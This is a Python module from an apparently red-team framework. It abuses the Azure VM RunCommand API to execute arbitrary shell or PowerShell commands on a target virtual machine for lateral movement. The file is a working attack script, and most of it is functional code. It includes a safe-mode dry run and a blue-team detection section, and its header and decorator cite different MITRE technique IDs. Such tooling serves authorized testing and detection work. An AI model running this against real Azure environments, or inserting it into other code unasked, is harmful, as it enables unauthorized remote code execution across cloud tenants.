# ================================================================
# TECHNIQUE: lateral_movement/azure_run_command
# ----------------------------------------------------------------
# TACTIC:    Lateral Movement (TA0008)
# TECHNIQUE: T1651 — Cloud Administration Command
#
# PURPOSE:   Abuse the Azure VM RunCommand API to execute arbitrary
#            commands on a target Virtual Machine without SSH or
#            RDP access. Requires only API access and
#            Microsoft.Compute/virtualMachines/runCommand permission.
#
# PROVIDERS: Azure
#
# HOW IT WORKS:
#   1. Resolves the target VM from ctx.params["vm_id"] (required).
#      vm_id is the full Azure resource ID, e.g.:
#      /subscriptions/<sub>/resourceGroups/<rg>/providers/
#        Microsoft.Compute/virtualMachines/<name>
#   2. Calls VirtualMachines.begin_run_command() with a RunCommandInput.
#   3. Polls until the operation completes (LRO).
#   4. Returns stdout and stderr from the command.
#
# PARAMETERS (via ctx.params):
#   vm_id   (required) — Full Azure VM resource ID
#   command (optional) — Shell command to run. Default: "id && hostname"
#   shell   (optional) — "bash" (Linux, default) or "powershell" (Windows)
#
# USAGE (interactive shell):
#   run lateral_movement/azure_run_command \
#     --param vm_id=/subscriptions/.../virtualMachines/target-vm \
#     --param command=id
#
# USAGE (agent mode):
#   qm --agent run lateral_movement/azure_run_command \
#     --param vm_id=/subscriptions/.../virtualMachines/target-vm
#
# SESSION CONTRACT:
#   Azure — ctx.session is a TokenCredential (TokenCredential)
#
# DETECTION (Blue Team):
#   Azure — Azure Monitor: Microsoft.Compute/virtualMachines/runCommand/action
#           Activity Log with operationName "Run Command On Virtual Machine"
#   Alert: Any runCommand activity outside a known maintenance window should
#          be investigated immediately.
#
# MITRE ATT&CK: T1651
#
# SAFE:     No — executes code on a remote VM.
# ================================================================

from __future__ import annotations

import logging
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

logger = logging.getLogger(__name__)

# ----------------------------------------------------------
# Optional Azure SDK — imported at module level so unit tests
# can patch ComputeManagementClient and RunCommandInput with
#   patch('quantum_mechanic.techniques.lateral_movement
#           .azure_run_command.ComputeManagementClient')
# ----------------------------------------------------------
try:
    from azure.mgmt.compute import ComputeManagementClient
    from azure.mgmt.compute.models import RunCommandInput
    _AZURE_AVAILABLE = True
except ImportError:
    ComputeManagementClient = None  # type: ignore[assignment,misc]
    RunCommandInput = None  # type: ignore[assignment,misc]
    _AZURE_AVAILABLE = False


@technique(
    technique_id="lateral_movement/azure_run_command",
    tactic="Lateral Movement",
    mitre_id="T1569.002",
    providers=["azure"],
    severity="critical",
    safe=False,
    description="Execute a command on a target Azure VM via the RunCommand API.",
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute a command on a target Azure VM via RunCommand.

    Args:
        ctx: Execution context. ctx.params must contain 'vm_id'.

    Returns:
        Dictionary with stdout, stderr, and execution metadata.
    """
    if not _AZURE_AVAILABLE:
        return {"error": "azure-mgmt-compute not installed.", "stdout": "", "stderr": ""}

    # ----------------------------------------------------------
    # Resolve required parameters
    # ----------------------------------------------------------
    vm_id = ctx.params.get("vm_id", "").strip()
    if not vm_id:
        return {
            "error": (
                "vm_id parameter is required. "
                "Usage: run lateral_movement/azure_run_command "
                "--param vm_id=/subscriptions/<id>/resourceGroups/<rg>/providers/"
                "Microsoft.Compute/virtualMachines/<name>"
            ),
            "stdout": "",
            "stderr": "",
        }

    command = ctx.params.get("command", "id && hostname").strip()
    shell = ctx.params.get("shell", "bash").strip().lower()

    # ----------------------------------------------------------
    # Parse the subscription ID and VM name from the resource ID.
    # Example: /subscriptions/{sub}/resourceGroups/{rg}/providers/
    #          Microsoft.Compute/virtualMachines/{name}
    # ----------------------------------------------------------
    parts = vm_id.lstrip("/").split("/")
    try:
        sub_idx = parts.index("subscriptions")
        subscription_id = parts[sub_idx + 1]
        rg_idx = parts.index("resourceGroups")
        resource_group = parts[rg_idx + 1]
        vm_name = parts[-1]
    except (ValueError, IndexError):
        return {
            "error": f"Could not parse VM resource ID: {vm_id!r}",
            "stdout": "",
            "stderr": "",
        }

    # ----------------------------------------------------------
    # Safe mode — report what WOULD run without executing.
    # ----------------------------------------------------------
    if ctx.safe_mode:
        return {
            "provider": "azure",
            "vm_id": vm_id,
            "vm_name": vm_name,
            "command": command,
            "safe_mode": True,
            "would_execute": True,
            "stdout": "",
            "stderr": "",
        }

    try:
        cred = ctx.session
        compute = ComputeManagementClient(cred, subscription_id)

        # ----------------------------------------------------------
        # Determine the command ID for the RunCommand API.
        # Windows VMs use "RunPowerShellScript"; Linux uses "RunShellScript".
        # ----------------------------------------------------------
        if shell == "powershell":
            command_id = "RunPowerShellScript"
        else:
            command_id = "RunShellScript"

        run_input = RunCommandInput(
            command_id=command_id,
            script=[command],
        )

        ctx.log(f"runCommand → vm={vm_name}, command={command[:80]}")

        # ----------------------------------------------------------
        # Poll the long-running operation (LRO) to completion.
        # timeout: 300 seconds (Azure's hard limit is ~1800s for RunCommand)
        # ----------------------------------------------------------
        poller = compute.virtual_machines.begin_run_command(
            resource_group_name=resource_group,
            vm_name=vm_name,
            parameters=run_input,
        )
        result = poller.result(timeout=300)

        # ----------------------------------------------------------
        # Extract stdout and stderr from the result value array.
        # Azure returns: list of InstanceViewStatus objects containing
        # 'code': 'ComponentStatus/StdOut/succeeded' or '.../StdErr/...'
        # and 'message': the actual string output.
        # ----------------------------------------------------------
        stdout = ""
        stderr = ""

        # ----------------------------------------------------------
        # Azure RunCommand result format (azure-mgmt-compute >= 30):
        #
        # Current SDK format (v30+): A single InstanceViewStatus with
        #   code = "ProvisioningState/succeeded" and message containing:
        #   "Enable succeeded: \n[stdout]\n<output>\n\n[stderr]\n<errors>"
        #
        # Legacy SDK format: Separate items with
        #   code = "ComponentStatus/StdOut/succeeded"
        #   code = "ComponentStatus/StdErr/succeeded"
        #
        # We handle both so this works across SDK versions.
        # ----------------------------------------------------------
        raw_values = getattr(result, "value", []) or []
        for item in raw_values:
            code = getattr(item, "code", "") or ""
            message = getattr(item, "message", "") or ""

            if "StdOut" in code:
                # Legacy format — dedicated stdout item
                stdout = message.strip()
            elif "StdErr" in code:
                # Legacy format — dedicated stderr item
                stderr = message.strip()
            elif "ProvisioningState" in code and message:
                # Current format — parse [stdout] / [stderr] blocks from message
                # Format: "Enable succeeded: \n[stdout]\n...\n[stderr]\n..."
                if "[stdout]" in message:
                    after_stdout = message.split("[stdout]", 1)[1]
                    if "[stderr]" in after_stdout:
                        stdout = after_stdout.split("[stderr]")[0].strip()
                        stderr = after_stdout.split("[stderr]", 1)[1].strip()
                    else:
                        stdout = after_stdout.strip()
                elif message.strip():
                    # Fallback: treat entire message as stdout if no markers
                    stdout = message.strip()

        return {
            "provider": "azure",
            "vm_id": vm_id,
            "vm_name": vm_name,
            "subscription_id": subscription_id,
            "resource_group": resource_group,
            "command": command,
            "shell": shell,
            "stdout": stdout,
            "stderr": stderr,
            "success": True,
        }

    except Exception as e:
        logger.error("azure_run_command failed for %s: %s", vm_id, e)
        return {
            "error": str(e),
            "vm_id": vm_id,
            "stdout": "",
            "stderr": "",
        }
